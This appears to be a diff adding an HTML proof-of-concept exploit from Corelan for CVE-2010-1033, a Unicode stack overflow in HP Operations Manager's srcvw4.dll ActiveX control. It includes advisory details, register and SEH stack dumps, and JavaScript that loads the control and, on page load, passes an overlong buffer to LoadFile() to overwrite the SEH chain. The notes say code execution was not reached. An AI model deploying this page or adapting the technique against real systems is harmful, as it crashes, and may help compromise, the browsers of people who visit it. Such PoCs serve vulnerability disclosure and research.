@@ -1,0 +1,87 @@
+<html>
+<!--
+		|------------------------------------------------------------------|
+		|                         __               __                      |
+		|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+		|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+		| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+		| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+		|                                                                  |
+		|                                       http://www.corelan.be:8800 |
+		|                                              security@corelan.be |
+		|                                                                  |
+		|-------------------------------------------------[ EIP Hunters ]--|
+
+# HP Operations Manager <= v8.16 - (srcvw4.dll) LoadFile()/SaveFile() Remote Unicode Stack Overflow PoC
+# Found by: mr_me - http://net-ninja.net/
+# Homepage: http://www.hp.com/
+# CVE: CVE-2010-1033
+# Tested on: Windows XP SP3 (IE 6 & 7)
+# Marked safe for scripting: No
+# Module path: C:\Program Files\HP\HP BTO Software\bin\srcvw4.dll
+# HP's Advisory: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02078800
+# Advisory: http://www.corelan.be:8800/advisories.php?id=10-027
+# Greetz: Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# ######################################################################################################
+# Notes: 
+# - This is a 3rd party library by Tetradyne Inc (not from HP) but HP take full responsibility
+# - /SafeSEH protected module
+# - The SaveFile() function is also vulnerable to a unicode stack overflow. 
+# - Having '\x42' or 'B' as the 2nd byte of nseh will cause us to overwrite the address
+# 	of seh handler itself and not the contents.
+# - There is simply no code execution on this because there is no unicode friendly
+# 	ppr's that I know of. However you could include other components, to get code execution.
+# ######################################################################################################
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.  
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+The Registers:
+
+EAX 002BD012
+ECX 000AEAAA
+EDX 02A90024 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..
+EBX 80070003
+ESP 0013DA1C
+EBP 0013DA70 UNICODE "Could not open file AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..
+ESI 02A9258C UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..
+EDI 00140000 ASCII "Actx "
+EIP 024DA413 srcvw4.024DA413
+
+The stack:
+
+0013B600   00410041  A.A.  iexplore.00410041
+0013B604   00410041  A.A.  iexplore.00410041
+0013B608   00430043  C.C.  Pointer to next SEH record
+0013B60C   00420042  B.B.  SE handler
+0013B610   00440044  D.D.
+0013B614   00440044  D.D.
+
+And remember, its better to try and fail, then fail to try :-)
+-->
+<object classid='clsid:366C9C52-C402-416B-862D-1464F629CA59' id='boom' ></object>
+<script language="JavaScript" defer> 
+  function b00m()  
+   {  
+    var buffSize = 1072;
+	var x = unescape("%41");
+	var y = unescape("%44");
+	// 'B' or \x41 as the 2nd byte of nseh will destroy our SEH chain
+	var nseh = unescape("%43%43");
+	var seh = unescape("%42%42");
+	while (x.length<buffSize) x += x;  
+    x = x.substring(0,buffSize); 
+	while (y.length<buffSize) y += y;  
+    y = y.substring(0,buffSize);	
+    boom.LoadFile(x+nseh+seh+y);
+  }  
+</script>  
+<body onload="JavaScript: return b00m();">    
+<p><center>~ mr_me presents ~</p>
+<p><b>HP Operations Manager <= v8.16 - (srcvw4.dll) LoadFile()/SaveFile() Remote Unicode Stack Overflow PoC</b></center></p> 
+</body>
+</html>
